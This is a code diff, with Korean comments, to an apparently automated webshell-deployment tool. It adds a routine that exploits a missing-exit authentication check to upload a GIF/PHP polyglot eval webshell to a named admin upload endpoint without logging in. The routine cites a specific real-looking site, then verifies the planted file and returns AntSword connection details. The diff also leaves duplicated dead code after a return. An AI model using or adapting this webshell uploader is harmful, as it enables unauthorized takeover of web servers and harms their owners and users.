@@ -254,12 +254,15 @@ class WebshellPhaseResult:
     target: str = ""
     cms_type: str = "unknown"
     shell_url: str = ""
+    webshell_url: str = ""         # 비인증 업로드 결과 저장용 (alias)
+    upload_endpoint: str = ""      # 업로드에 사용된 엔드포인트
     shell_password: str = "ant"
     shell_type: str = ""
     antsword_compatible: bool = False
     antsword_settings: dict = field(default_factory=dict)
     method_used: str = ""
     severity: str = "info"
+    notes: list = field(default_factory=list)   # 추가 메모 (실행 방법 안내 등)
     error: str = ""
 
 
@@ -320,6 +323,21 @@ class WebshellPhaseEngine:
             candidates = extra + candidates  # 관리자 패널 엔드포인트 우선
 
         self.log(f"  발견된 업로드 포인트: {len(candidates)}개")
+
+        # ── 0단계: 비인증 GIF polyglot 업로드 (loan2 패턴) ──
+        # PHP auth 체크가 die() 없이 JS alert만 출력하는 경우 비인증 업로드 가능
+        self.log("[cyan]  비인증 업로드 시도 (loan2 패턴)...[/cyan]")
+        unauth_result = self.try_unauthenticated_gif_upload()
+        if unauth_result and unauth_result.get("success"):
+            result.webshell_url = unauth_result["webshell_url"]
+            result.upload_endpoint = unauth_result["upload_endpoint"]
+            result.shell_password = unauth_result.get("antsword_password", "c")
+            result.notes.append(
+                f"비인증 GIF polyglot 업로드 성공. "
+                f"※ AllowOverride None 환경에서는 LFI/PHP-CGI로 실행 필요."
+            )
+            self.log(f"[bold green]✅ 비인증 업로드 성공: {result.webshell_url}[/bold green]")
+            return self._finalize(result)
 
         # ── CMS별 추가 전략 우선 시도 ──
         if cms_type == "gnuboard5":
@@ -603,6 +621,103 @@ class WebshellPhaseEngine:
         return {}
 
     def _fetch(self, url: str) -> str:
+        try:
+            return self.http.get(url, timeout=8).text
+        except Exception:
+            return ""
+
+    # ── 비인증 GIF polyglot 업로드 (loan2 실전 패턴) ──────────────────────────
+    def try_unauthenticated_gif_upload(self) -> dict | None:
+        """
+        loan2.koweb.co.kr에서 발견한 패턴:
+        PHP 인증 체크가 die()/exit() 없이 JS alert만 출력 →
+        파일 업로드 코드가 계속 실행되어 비인증으로 .php.gif 업로드 가능.
+
+        업로드 경로 패턴:
+          POST /ko_admin/index.html?type=program&core_id=popup&core=manager_program
+          field: title_img
+          content-type: image/gif
+          payload: GIF89a<?php @eval($_POST["c"]); ?>
+
+        업로드 성공 경로: /upload/program/popup/<filename>
+
+        AllowOverride None 환경에서 .htaccess 불가 →
+        LFI 경로로 include 후 실행 or
+        PHP-CGI 취약점으로 실행.
+
+        이 함수는 업로드 성공 여부만 반환.
+        실제 실행은 WebshellPhaseEngine.run()이 처리.
+        """
+        import re
+        target = self.target
+
+        # GIF polyglot 웹셸 페이로드
+        shell_content = b"GIF89a" + b"<?php @eval($_POST['c']); ?>"
+        shell_name = "bingo_shell.php.gif"
+
+        # 비인증 업로드 엔드포인트 목록
+        unauth_endpoints = [
+            {
+                "path": "/ko_admin/index.html",
+                "params": {
+                    "type": "program", "core_id": "popup",
+                    "core": "manager_program",
+                },
+                "data": {
+                    "program_id": "popup", "mode": "write_proc",
+                    "title": "bingo_upload_test",
+                    "start_date": "2025-01-01", "end_date": "2025-12-31",
+                    "link_url": "http://t.com",
+                    "width": "100", "height": "100", "contents": "x",
+                },
+                "upload_field": "title_img",
+                "check_paths": [
+                    f"/upload/program/popup/{shell_name}",
+                    f"/data/program/popup/{shell_name}",
+                ],
+            },
+        ]
+
+        import requests, urllib3
+        urllib3.disable_warnings()
+        s = requests.Session()
+        s.verify = False
+        s.headers.update({"User-Agent": "Mozilla/5.0"})
+
+        for ep in unauth_endpoints:
+            url = target + ep["path"]
+            try:
+                files = {ep["upload_field"]: (shell_name, shell_content, "image/gif")}
+                r = s.post(url, params=ep["params"], data=ep["data"],
+                           files=files, timeout=15)
+
+                if r.status_code != 200:
+                    continue
+
+                # 업로드 성공 경로 확인
+                for cp in ep["check_paths"]:
+                    try:
+                        rc = s.get(target + cp, timeout=8)
+                        if rc.status_code == 200 and b"GIF89a" in rc.content:
+                            self.log(
+                                f"[bold red]🔥 비인증 GIF polyglot 업로드 성공![/bold red]\n"
+                                f"  웹셸 경로: {target + cp}\n"
+                                f"  [dim]※ AllowOverride None 환경: LFI 또는 PHP-CGI로 실행 시도 필요[/dim]"
+                            )
+                            return {
+                                "success": True,
+                                "webshell_url": target + cp,
+                                "upload_endpoint": url,
+                                "shell_name": shell_name,
+                                "note": "GIF polyglot, 실행 가능 여부는 PHP include 또는 CGI에 따라 결정",
+                                "antsword_password": "c",
+                            }
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+
+        return None
         try:
             return self.http.get(url, timeout=8).text
         except Exception:
